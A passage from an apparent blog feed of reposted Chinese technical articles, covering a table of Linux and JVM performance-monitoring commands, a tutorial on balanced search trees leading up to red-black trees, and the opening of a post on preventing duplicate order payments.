class="line">157518=2*3*3*3*2917</span><br><span class="line">illegalArgumentCount:  1, number is: -187733, need &gt;= 2</span><br><span class="line">illegalArgumentCount:  2, number is: -102156, need &gt;= 2</span><br><span class="line">173379=3*57793</span><br></pre></td></tr></tbody></table></figure><h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>在使用linux命令时，如果想看帮助可以使用<code>--help</code>或者<code>man</code>查看帮助信息：</p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">[root@localhost ~]# grep --help</span><br><span class="line">用法: grep [选项]... PATTERN [FILE]...</span><br><span class="line">在每个 FILE 或是标准输入中查找 PATTERN。</span><br><span class="line">默认的 PATTERN 是一个基本正则表达式(缩写为 BRE)。</span><br><span class="line">例如: grep -i 'hello world' menu.h main.c</span><br><span class="line">...</span><br><span class="line">[root@localhost ~]# man grep</span><br><span class="line"></span><br><span class="line">GREP(1)                                                        General Commands Manual                                                        GREP(1)</span><br><span class="line"></span><br><span class="line">NAME</span><br><span class="line">       grep, egrep, fgrep - 打印匹配给定模式的行</span><br><span class="line"></span><br><span class="line">总览 SYNOPSIS</span><br><span class="line">       grep [options] PATTERN [FILE...]</span><br><span class="line">       grep [options] [-e PATTERN | -f FILE] [FILE...]</span><br><span class="line"></span><br><span class="line">描述 DESCRIPTION</span><br><span class="line">       Grep    搜索以    FILE    命名的文件输入   (或者是标准输入，如果没有指定文件名，或者给出的文件名是   -   的话)，寻找含有与给定的模式   PATTERN</span><br><span class="line">...</span><br></pre></td></tr></tbody></table></figure><table><thead><tr><th align="left">类别</th><th align="left">监控命令</th><th align="left">描述</th><th align="left">备注</th></tr></thead><tbody><tr><td align="left">内存瓶颈</td><td align="left">free</td><td align="left">查看内存使用</td><td align="left"></td></tr><tr><td align="left"></td><td align="left">vmstat 3(间隔时间) 100(监控次数)</td><td align="left">查看swap in/out详细定位是否存在性能瓶颈</td><td align="left">推荐使用</td></tr><tr><td align="left"></td><td align="left">sar -r 3</td><td align="left">和free命令类似，查看内存的使用情况，但是不包含swap的情况</td><td align="left"></td></tr><tr><td align="left">cpu瓶颈</td><td align="left">top -H</td><td align="left">按照cpu消耗高低进行排序</td><td align="left"></td></tr><tr><td align="left"></td><td align="left">ps -Lp 进程号 cu</td><td align="left">查看某个进程的cpu消耗排序</td><td align="left"></td></tr><tr><td align="left"></td><td align="left">cat /proc/cpuinfo |grep ‘processor’|wc -l</td><td align="left">查看cpu核数</td><td align="left"></td></tr><tr><td align="left"></td><td align="left">top</td><td align="left">查看cpu总体消耗，包括分项消耗如user,system,idle,nice等消耗</td><td align="left"></td></tr><tr><td align="left"></td><td align="left">top 然后shift+h:显示java线程，然后shift+M:按照内存使用进行排序；shift+P:按照cpu时间排序;shift+T:按照cpu累计使用时间排序多核cpu，按“1”进入top视图</td><td align="left">专项性能排查，多核CPU主要看CUP各个内核的负载情况</td><td align="left"></td></tr><tr><td align="left"></td><td align="left">sar -u 3(间隔时间)</td><td align="left">查看cpu总体消耗占比</td><td align="left"></td></tr><tr><td align="left"></td><td align="left">sar -q</td><td align="left">查看cpu load</td><td align="left"></td></tr><tr><td align="left"></td><td align="left">top -b -n 1 | awk ‘{if (NR&lt;=7)print;else if($8==”D”){print;count++}}END{print “Total status D:”count}’</td><td align="left">计算在cpu load里面的uninterruptedsleep的任务数量 uninterruptedsleep的任务会被计入cpu load，如磁盘堵塞</td><td align="left"></td></tr><tr><td align="left">网络瓶颈</td><td align="left">cat /var/log/messages</td><td align="left">查看内核日志，查看是否丢包</td><td align="left"></td></tr><tr><td align="left"></td><td align="left">watch more /proc/net/dev</td><td align="left">用于定位丢包，错包情况，以便看网络瓶颈</td><td align="left">重点关注drop(包被丢弃)和网络包传送的总量，不要超过网络上限</td></tr><tr><td align="left"></td><td align="left">sar -n SOCK</td><td align="left">查看网络流量</td><td align="left"></td></tr><tr><td align="left"></td><td align="left">netstat -na|grep ESTABLISHED|wc -l</td><td align="left">查看tcp连接成功状态的数量</td><td align="left">此命令特别消耗cpu，不适合进行长时间监控数据收集</td></tr><tr><td align="left"></td><td align="left">netstat -na|awk’{print $6}’|sort |uniq -c |sort -nr</td><td align="left">看tcp各个状态数量</td><td align="left"></td></tr><tr><td align="left"></td><td align="left">netstat -i</td><td align="left">查看网络错误</td><td align="left"></td></tr><tr><td align="left"></td><td align="left">ss state ESTABLISHED| wc -l</td><td align="left">更高效地统计tcp连接状态为ESTABLISHED的数量</td><td align="left"></td></tr><tr><td align="left"></td><td align="left">cat /proc/net/snmp</td><td align="left">查看和分析240秒内网络包量，流量，错包，丢包</td><td align="left">用于计算重传率<code>tcpetr=RetransSegs/OutSegs</code></td></tr><tr><td align="left"></td><td align="left">ping $ip</td><td align="left">测试网络性能</td><td align="left"></td></tr><tr><td align="left"></td><td align="left">traceroute $ip</td><td align="left">查看路由经过的地址</td><td align="left">常用于定位网络在各个路由区段的耗时</td></tr><tr><td align="left"></td><td align="left">dig $域名</td><td align="left">查看域名解析地址</td><td align="left"></td></tr><tr><td align="left"></td><td align="left">dmesg</td><td align="left">查看系统内核日志</td><td align="left"></td></tr><tr><td align="left">磁盘瓶颈</td><td align="left">iostat -x -k -d 1</td><td align="left">详细列出磁盘的读写情况</td><td align="left">当看到I/O等待时间所占CPU时间的比重很高的时候，首先要检查的就是机器是否正在大量使用交换空间，同时关注iowait占比cpu的消耗是否很大，如果大说明磁盘存在大的瓶颈，同时关注await，表示磁盘的响应时间以便小于5ms</td></tr><tr><td align="left"></td><td align="left">iostat -x</td><td align="left">查看系统各个磁盘的读写性能</td><td align="left">重点关注await和iowait的cpu占比</td></tr><tr><td align="left"></td><td align="left">iotop</td><td align="left">查看哪个进程在大量读取IO</td><td align="left">一般先通过iostat查看是否存在io瓶颈，再定位哪个进程在大量读取IO</td></tr><tr><td align="left"></td><td align="left">df -hl</td><td align="left">查看磁盘剩余空间</td><td align="left"></td></tr><tr><td align="left"></td><td align="left">du -sh</td><td align="left">查看磁盘使用了多少空间</td><td align="left"></td></tr><tr><td align="left">应用瓶颈</td><td align="left">ps -ef</td><td align="left">grep java</td><td align="left">查看某个进程的id号</td></tr><tr><td align="left"></td><td align="left">ps -ef | grep httpd| wc -l</td><td align="left">查看特定进程的数量</td><td align="left"></td></tr><tr><td align="left"></td><td align="left">cat ***.log | grep ***Exception| wc -l</td><td align="left">统计日志文件中包含特定异常数量</td><td align="left"></td></tr><tr><td align="left"></td><td align="left">jstack -l pid</td><td align="left">用于查看线程是否存在死锁</td><td align="left"></td></tr><tr><td align="left"></td><td align="left">awk’{print $8}’ 2017-05-22-access_log|egrep ‘301|302’| wc -l</td><td align="left">统计log中301、302状态码的行数，$8表示第八列是状态码，可以根据实际情况更改</td><td align="left">常用于应用故障定位</td></tr><tr><td align="left"></td><td align="left">grep ‘wholesaleProductDetailNew’ cookie_log | awk ‘{if($10==”200”)}’print}’</td><td align="left">awk ‘print $12’ | more</td><td align="left">打印包含特定数据的12列数据</td></tr><tr><td align="left"></td><td align="left">grep “2017:05:22” cookielog | awk ‘($12&gt;0.3){print 8}’ | sort &gt; 目录地址</td><td align="left">对apache或者nginx访问log进行响应时间排序，$12表示cookie log中的12列表示响应时间 用于排查是否是由于是某些访问超长造成整体的RT变长</td><td align="left"></td></tr><tr><td align="left"></td><td align="left">grep -v ‘HTTP/1.1” 200’</td><td align="left">取出非200响应码的URL</td><td align="left"></td></tr><tr><td align="left"></td><td align="left">pgm -A -f $应用集群名称 “grep “‘301’ log文件地址 | wc -l”</td><td align="left">查看整个集群的log中301状态码的数量</td><td align="left"></td></tr><tr><td align="left"></td><td align="left">ps -efL | grep [PID] | wc -l</td><td align="left">查看某个进程创建的线程数</td><td align="left"></td></tr><tr><td align="left"></td><td align="left">find / -type f -name “*.log” | xargs grep “ERROR”</td><td align="left">统计所有的log文件中，包含Error字符的行</td><td align="left">这个在排查问题过程中比较有用</td></tr><tr><td align="left"></td><td align="left">jstat -gc [pid]</td><td align="left">查看gc情况</td><td align="left"></td></tr><tr><td align="left"></td><td align="left">jstat -gcnew [pid]</td><td align="left">查看young区的内存使用情况，包括MTT(最大交互次数就被交换到old区)，TT是目前已经交换的次数</td><td align="left"></td></tr><tr><td align="left"></td><td align="left">jstat -gcold</td><td align="left">查看old区的内存使用情况</td><td align="left"></td></tr><tr><td align="left"></td><td align="left">jmap -J-d64 -dump:format=b,file=dump.bin PID</td><td align="left">dump出内存快照</td><td align="left">-J-d64防止jmap导致虚拟机crash(jdk6有bug)</td></tr><tr><td align="left"></td><td align="left">-XX:+HeapDumpOnOutOfMemeryError</td><td align="left">在java启动时加入，当出现内存溢出时，存储内存快照</td><td align="left"></td></tr><tr><td align="left"></td><td align="left">jmap -histo [pid]</td><td align="left">按照对象内存大小排序</td><td align="left">注意会导致full gc</td></tr><tr><td align="left"></td><td align="left">gcore [pid]</td><td align="left">导出完成的内存快照</td><td align="left">通常和<code>jmap -permstat /opt/**/java gcore.bin</code>一起使用，将core dump转换成heap dump</td></tr><tr><td align="left"></td><td align="left">-XX:HeapDumpPath=/home/logs -Xloggc:/home/log/gc.log -XX:+PrintGCDetails -XX:+PrintGCDateStamps</td><td align="left">在Java启动参数中加入，打印gc日志</td><td align="left"></td></tr><tr><td align="left"></td><td align="left">-server -Xms4000m -Xmx4000m -Xmn1500m -Xss256k -XX:PermSize=340m -XX:MaxPermSize=340m -XX:+UseConcMarkSweepGC</td><td align="left">调整JVM堆大小</td><td align="left">xss是栈大小</td></tr></tbody></table><p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/posts/1696090382/640-20230824233951442.png" alt="Image"></p><p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/posts/1696090382/640-20230824233951481.png" alt="Image"></p><p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/posts/1696090382/640-20230824233951399.png" alt="Image"></p><p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/posts/1696090382/640-20230824233951517.png" alt="Image"></p>]]></content>
      
      
      <categories>
          
          <category> 转载 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 转载 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>如何彻底理解红黑树</title>
      <link href="/posts/312572753/"/>
      <url>/posts/312572753/</url>
      
        <content type="html"><![CDATA[<p><em>作者**：linzworld</em></p><p>cnblogs.com/linzworld/p/13720477.html</p><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>本文主要讲解下最近一直听到的<strong>红黑树</strong>，看看究竟是什么神仙鬼怪。</p><h2 id="二叉树"><a href="#二叉树" class="headerlink" title="二叉树"></a>二叉树</h2><p>满足以下两个条件的树就是二叉树：</p><ol><li>本身是有序树（若将树中每个结点的各子树看成是从左到右有次序的(即不能互换)，则称该树为有序树(Ordered Tree)）；</li><li>树中包含的各个节点的度不能超过 2，即只能是 0、1 或者 2；</li></ol><p>简单地理解，二叉树（Binary tree）是<strong>每个节点最多只有两个分支</strong>（即不存在分支度大于2的节点）的树结构。通常分支被称作“左子树”或“右子树”。</p><p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/posts/312572753/640.png" alt="图片"></p><h2 id="二叉查找树"><a href="#二叉查找树" class="headerlink" title="二叉查找树"></a>二叉查找树</h2><p>要了解红黑树之前，免不了先看下二叉查找树是什么。</p><h3 id="维基百科上的定义"><a href="#维基百科上的定义" class="headerlink" title="维基百科上的定义"></a>维基百科上的定义</h3><p><strong>二叉查找树</strong>（英语：Binary Search Tree），也称为<strong>二叉搜索树</strong>、<strong>有序二叉树</strong>（ordered binary tree）或<strong>排序二叉树</strong>（sorted binary tree），是指一棵空树或者具有下列性质的二叉树</p><ol><li>若任意节点的左子树不空，则左子树上所有节点的值均小于它的根节点的值；</li><li>若任意节点的右子树不空，则右子树上所有节点的值均大于或等于它的根节点的值；</li><li>任意节点的左、右子树也分别为二叉查找树；</li></ol><h3 id="图示理解"><a href="#图示理解" class="headerlink" title="图示理解"></a>图示理解</h3><p>下图为查找值为29的节点，有以下步骤：</p><ol><li>查看根节点41</li><li>因为41&gt; 29 ,所以查看41的左孩子20</li><li>因为20 &lt; 29 ,所以查看20的右孩子29，发现其正好是要查看的节点。</li></ol><p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/posts/312572753/640.gif" alt="图片"></p><h3 id="退化"><a href="#退化" class="headerlink" title="退化"></a>退化</h3><p>二叉查找树有个非常严重的问题，如果数据的插入是从大到小插入的，或者是从小到大插入的话，会导致二叉查找树退化成单链表的形式，俗称“瘸子“。</p><ol><li><p>左瘸子：例如，插入数据依次为{5,4,3,2,1}（从大到小），则如下图所示：<img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/posts/312572753/640-20230824233810184.gif" alt="图片"></p></li><li><p>右瘸子：例如，插入数据依次为{1,2,3,4,5}（从小到大），则如下图所示：</p><p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/posts/312572753/640-20230824233810154.gif" alt="图片"></p></li></ol><p>为了解决该问题，出现了一些解决方法，即平衡，能够使得树趋向平衡，这种自平衡的树叫做平衡树。</p><h2 id="平衡树"><a href="#平衡树" class="headerlink" title="平衡树"></a>平衡树</h2><p>平衡树(Balance Tree，BT) 指的是，<strong>任意节点的子树的高度差都小于等于1</strong>。常见的符合平衡树的有AVL树（二叉平衡搜索树），B树（多路平衡搜索树，2-3树，2-3-4树中的一种），红黑树等。</p><h2 id="AVL树"><a href="#AVL树" class="headerlink" title="AVL树"></a>AVL树</h2><p>AVL树（由发明者<strong>A</strong>delson-<strong>V</strong>elsky 和 <strong>L</strong>andis 的首字母缩写命名），是<strong>指任意节点的两个子树的高度差不超过1的平衡树</strong>。又称</p><p><strong>自平衡二叉搜索树</strong>。</p><p>AVL树能解决上文二叉查找树中的右瘸子问题，例如，插入数据依次为{1,2,3,4,5}（从小到大），则如下图所示：</p><p><strong>AVL树会对不符合高度差的结构进行调整，从而使得二叉树趋向平衡</strong>。</p><p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/posts/312572753/640-20230824233810198.gif" alt="图片"></p><h2 id="2-3树"><a href="#2-3树" class="headerlink" title="2-3树"></a>2-3树</h2><h3 id="基本概念"><a href="#基本概念" class="headerlink" title="基本概念"></a>基本概念</h3><p><strong>2-3树</strong>，是指每个具有子节点的节点（内部节点，internal node）要么有两个子节点和一个数据元素，要么有三个子节点和两个数据元素的自平衡的树，它的所有叶子节点都具有相同的高度。</p><p>简单点讲，2-3树的非叶子节点都具有两个分叉或者三个分叉，所以，称作<strong>2叉-3叉树</strong>更容易理解。</p><p>另外一种说法，<strong>具有两个子节点和一个数据元素的节点又称作2节点</strong>，<strong>具有三个子节点和两个数据元素的节点又称作3节点</strong>，所以，整颗树叫做2-3树。</p><p><strong>所有叶子点都在树的同一层，一样高</strong>。</p><blockquote><p>性质1. 满足二叉搜索树的性质<br>性质2. 节点可以存放一个或两个元素<br>性质3. 每个节点有两个或三个子节点</p></blockquote><p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/posts/312572753/640-20230824233810160.png" alt="图片">img</p><h3 id="创建2-3树的规则"><a href="#创建2-3树的规则" class="headerlink" title="创建2-3树的规则"></a>创建2-3树的规则</h3><p>插入操作</p><ol><li>向2-节点中插入元素</li></ol><p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/posts/312572753/640.jpeg" alt="图片">img</p><ol><li>向一颗只含有一个3-节点的树中插入元素</li></ol><p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/posts/312572753/640-20230824233810138.jpeg" alt="图片">img</p><h2 id="2-3-4树"><a href="#2-3-4树" class="headerlink" title="2-3-4树"></a>2-3-4树</h2><h3 id="含义"><a href="#含义" class="headerlink" title="含义"></a>含义</h3><ol><li>2节点：包含两个子节点和一个数据元素</li><li>3节点：包含三个子节点和一个数据元素</li><li>4节点：包含四个子节点和一个数据元素</li></ol><p><strong>2-3-4树</strong>，它的每个非叶子节点，要么是2节点，要么是3节点，要么是4节点，且可以自平衡，所以称作2-3-4树。</p><p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/posts/312572753/640-20230824233810162.png" alt="图片"></p><h3 id="规则"><a href="#规则" class="headerlink" title="规则"></a>规则</h3><blockquote><p>规则1. 加入新节点时，不会往空的位置添加节点，而是添加到最后一个叶子节点上<br>规则2. 四节点可以被分解三个2-节点组成的树，并且分解后新树的根节点需要向上和父节点融合</p></blockquote><h3 id="插入操作"><a href="#插入操作" class="headerlink" title="插入操作"></a>插入操作</h3><ol><li>原本的2-3-4树<br><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/posts/312572753/640-20230824233810162.png" alt="图片"></li><li>对于上图的2-3-4树，插入一个节点17，由于规则1，节点17不会加入节点[16,18,20]的子树，而是与该节点融合。<br><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/posts/312572753/640-20230824233810213.png" alt="图片"></li><li>由于规则2，节点[16,17,18,20]是一个4节点，将该节点进行拆解成新的树，将18作为子树的根节点进行拆分。<br><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/posts/312572753/640-20230824233810177.png" alt="图片"></li><li>此时树暂时失去了平衡，我们需要将拆分后的子树的根节点向上进行融合。<br><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/posts/312572753/640-20230824233810259.png" alt="图片"></li><li>同理可得，由于规则2，节点[6,10,14,18]是一个4节点，将该节点进行拆解成新的树，将14作为子树的根节点进行拆分，完成了2-3-4树的构建。<br><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/posts/312572753/640-20230824233810181.png" alt="图片"></li></ol><p>总结了下插入节点的过程，无非也就为了符合两条规则，那么，2-3树，2-3-4树都有了，那是不是也有2-3-4-5树，2-3-4-5–…-n树的存在呢？事实上是有的，世人把这一类树称为一个名字：B树。</p><h2 id="B树"><a href="#B树" class="headerlink" title="B树"></a>B树</h2><p><strong>B树</strong>，表示的是一类树，它允许一个节点可以有多于两个子节点，同时，也是自平衡的，叶子节点的高度都是相同的。</p><p>所以，为了更好地区分一颗B树到底属于哪一类树，我们给它一个新的属性：<strong>度（Degree）：一个节点能有多少箭头指向其他节点</strong>。</p><p>具有度为3的B树，表示一个节点最多有三个子节点，也就是2-3树的定义。</p><p>具有度为4的B树，表示一个节点最多有四个子节点，也就是2-3-4树的定义。</p><p>度为4的B树的示例图：</p><p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/posts/312572753/640-20230824233810162.png" alt="图片"></p><h2 id="红黑树"><a href="#红黑树" class="headerlink" title="红黑树"></a>红黑树</h2><p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/posts/312572753/640-20230824233810241-2891490.png" alt="图片"></p><h3 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h3><p>R-B Tree，全称是Red-Black Tree，又称为“<strong>红黑树</strong>”，它一种特殊的二叉查找树。红黑树的每个节点上都有存储位表示节点的颜色，可以是红(Red)或黑(Black)。</p><h3 id="如何理解红黑树"><a href="#如何理解红黑树" class="headerlink" title="如何理解红黑树"></a>如何理解红黑树</h3><p>一个经典的红黑树如下图所示（省略了叶子节点都是黑色的NIL节点）</p><p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/posts/312572753/640-20230824233810199.png" alt="图片"></p><p>如图2所示，将该红黑树与上文讲到的2-3-4树对比，是否发现，<strong>红黑树就是一个2-3-4树</strong>。</p><p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/posts/312572753/640-20230824233810259-2891490.png" alt="图片"></p><ol><li><p>每个节点或者是黑色，或者是红色。</p></li><li><p><strong>根节点是黑色</strong>。</p></li><li><p><strong>每个叶子节点（NIL）是黑色</strong>。[注意：这里叶子节点，是指为空(NIL或NULL)的叶子节点！]</p></li><li><p>如果一个节点是红色的，则它的子节点必须是黑色的。<br>由于红黑树的每个节点都是由2-3-4树转化而来的，从而红色节点不能连续两个出现，不然会出现4节点的情况，导致违反了规则2。而且红黑树的每一个黑节点都是3节点中的最中间的那个值，或者是2节点中其中一个值。</p></li><li><p><strong>从一个节点到该节点的子孙节点的所有路径上包含相同数目的黑节点</strong>。<br>原因：红黑树这些黑色节点在2-3-4树中代表的是由1节点的一个2-3-4树，而2-3-4树是同一个子树的深度是相同的，平衡的，所以从一个节点到该节点的子孙节点的所有路径上包含相同数目的黑节点。（如下图所示，蓝色代表是黑色节点）</p><p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/posts/312572753/640-20230824233810218.png" alt="图片"></p></li></ol><p>注意：</p><ol><li>特性(3)中的叶子节点，是只为空(NIL或null)的节点。</li><li>特性(5)，<strong>确保没有一条路径会比其他路径长出俩倍</strong>。因而，红黑树是相对是接近平衡的二叉树。</li><li>红黑树虽然本质上是一棵二叉查找树，但它在二叉查找树的基础上增加了着色和相关的性质使得红黑树相对平衡，从而保证了红黑树的查找、插入、删除的时间复杂度最坏为**O(log n)**。</li></ol><blockquote><p>由上面的例子所示，我们只要把红黑树当做是2-3-4树来处理，并且对应的颜色进行改变或者进行左旋右旋的操作，即可达到使得红黑树平衡的目标。</p></blockquote><h3 id="如何保持红黑树的结构"><a href="#如何保持红黑树的结构" class="headerlink" title="如何保持红黑树的结构"></a>如何保持红黑树的结构</h3><p>当我们插入一个新的节点的时候，如何保证红黑树的结构依然能够符合上面的五个特性呢？</p><p>树的旋转分为左旋和右旋，下面借助图来介绍一下左旋和右旋这两种操作。</p><h4 id="左旋"><a href="#左旋" class="headerlink" title="左旋"></a>左旋</h4><h5 id="原本的状态"><a href="#原本的状态" class="headerlink" title="原本的状态"></a>原本的状态</h5><p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/posts/312572753/640-20230824233810220.png" alt="图片"></p><h5 id="过程图"><a href="#过程图" class="headerlink" title="过程图"></a>过程图</h5><p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/posts/312572753/640-20230824233810272.gif" alt="图片"></p><h5 id="结束图"><a href="#结束图" class="headerlink" title="结束图"></a>结束图</h5><p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/posts/312572753/640-20230824233810241.png" alt="图片"></p><p>如上图所示，当在某个目标结点E上，做左旋操作时，我们假设它的右孩子S不是NIL。左旋以S到E之间的链为“支轴”进行，它使S成为该子树的新根，而S的左孩子则成为E的右孩子。</p><h4 id="右旋"><a href="#右旋" class="headerlink" title="右旋"></a>右旋</h4><h5 id="原先状态图"><a href="#原先状态图" class="headerlink" title="原先状态图"></a>原先状态图</h5><p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/posts/312572753/640-20230824233810261.png" alt="图片"></p><h5 id="过程图-1"><a href="#过程图-1" class="headerlink" title="过程图"></a>过程图</h5><p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/posts/312572753/640-20230824233810336.gif" alt="图片"></p><h5 id="结束图-1"><a href="#结束图-1" class="headerlink" title="结束图"></a>结束图</h5><p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/posts/312572753/640-20230825000333375-2893016.png" alt="图片"></p><p>同左旋类似，当在某个目标结点S上，做右旋操作时，我们假设它的右孩子S不是NIL。左旋以S到E之间的链为“支轴”进行，它使S成为该子树的新根，而S的左孩子则成为E的右孩子。</p><h2 id="应用"><a href="#应用" class="headerlink" title="应用"></a>应用</h2><p>红黑树的应用比较广泛，主要是用它来存储<strong>有序的数据</strong>，它的时间复杂度是O(<strong>logn</strong>)，效率非常之高。<br>例如，<strong>Java集合中的TreeSet和TreeMap</strong>，C++ STL中的set、map，以及<strong>Linux虚拟内存的管理</strong>，都是通过红黑树去实现的。</p><h2 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h2><p><a href="https://visualgo.net/zh">VisuAlgo - 数据结构和算法动态可视化 (Chinese)</a></p><p>《数据结构与算法之美》</p><p><a href="https://www.cs.usfca.edu/~galles/visualization/RedBlack.html">Red/Black Tree Visualization</a></p><p><a href="https://blog.csdn.net/v_JULY_v/article/details/6105630">(3条消息)教你初步了解红黑树_结构之法 算法之道-CSDN博客</a></p><p><a href="https://juejin.im/post/6873458286998650893#heading-9">了解红黑树的起源，理解红黑树的本质</a></p><p><a href="https://blog.popkx.com/the-principles-and-characteristics-of-linux-learning-21-self-balanced-binary-tree-and-red-black-tree/">linux学习21，自平衡二叉树和红黑树的原理和特点 - 刘冲的博客</a></p><p><a href="https://zhuanlan.zhihu.com/p/104031183">动画 | 什么是2-3树？ - 知乎</a></p>]]></content>
      
      
      <categories>
          
          <category> 转载 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 转载 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>服务端如何防止订单重复支付</title>
      <link href="/posts/1362641175/"/>
      <url>/posts/1362641175/</url>
      
        <content type="html"><![CDATA[<h1 id="服务端如何防止订单重复支付！"><a href="#服务端如何防止订单重复支付！" class="headerlink" title="服务端如何防止订单重复支付！"></a>服务端如何防止订单重复支付！</h1><blockquote><p>作者：废物大师兄</p><p><a href="http://www.cnblogs.com/cjsblog/p/14516909.html">www.cnblogs.com/cjsblog/p/14516909.html</a></p></blockquote><p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/posts/1362641175/640-20230824234311056.png" alt="Image"></p><p>如图是一个简化的下单流程，首先是提交订单，然后是支付。支付的话，一般是走支付网关（支付中心），然后支付中心与第三方支付渠道（微信、支付宝、银联）交互，支付成功以后，异步通知支付中心，支付中心更新自身支付订单状态，再通知业务应用，各业务再更新各自订单状态。</p><p>这个过程中经常可能遇到的问题是掉单，无论是超时未收到回调通知也好，还是程序自身报错也好，总之由于各种各样的原因，没有如期收到通知并正确的处理后续逻辑等等，都会造成用户支付成功了，但是服务端这边订单状态没更新，这个时候有可能产生投诉，或者用户重复支付。</p><p>由于③⑤造成的掉单称之为外部掉单，由④⑥造成的掉单我们称之为内部掉单</p><p>为了防止掉单，这里可以这样处理：</p><p>1、支付订单增加一个中间状态“支付中”，当同一个订单去支付的时候，先检查有没有状态为“支付中”的支付流水，当然支付（prepay）的时候要加个锁。支付完成以后更新支付流水状态的时候再讲其改成“支付成功”状态。</p><p>2、支付中心这边要自己定义一个超时时间（比如：30秒），在此时间范围内如果没有收到支付成功回调，则应调用接口主动查询支付结果，比如10s、20s、30s查一次，如果在最大查询次数内没有查到结果，应做异常处理</p><p>3、支付中心收到支付结果以后，将结果同步给业务系统，可以发MQ，也可以直接调用，直接调用的话要加重试（比如：SpringBoot 